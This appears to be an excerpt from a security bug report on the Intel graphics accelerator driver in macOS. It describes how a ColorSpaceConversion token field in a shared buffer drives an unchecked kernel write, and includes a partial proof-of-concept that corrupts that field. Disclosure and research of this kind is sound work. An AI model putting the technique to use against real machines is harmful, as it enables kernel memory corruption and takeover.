...
It's userclient 0x100 of the IntelAccelerator IOService. IOConnectMapMemory type=0 of this userclient is a shared token
buffer. Token 0x8a is ColorSpaceConversion, implemented in IGAccelVideoContextMain::process_token_ColorSpaceConversion
The dword at offset 0x14 of this token is used to compute the offset
...
{ 
  ...
  if (selector == 2 && connection == main_port){
    ...
    if (token_buf != 0){
      ...
      uint16_t ColorSpaceConversion = 0x8a00;
      uint32_t* tok = memmem(token_buf, token_buf_size, &ColorSpaceConversion, 2);
      if (tok){
        tok[0x14/4] = 0x12345678; //this will be used to compute an index for a write, without any bounds checking
      }
    }
  }
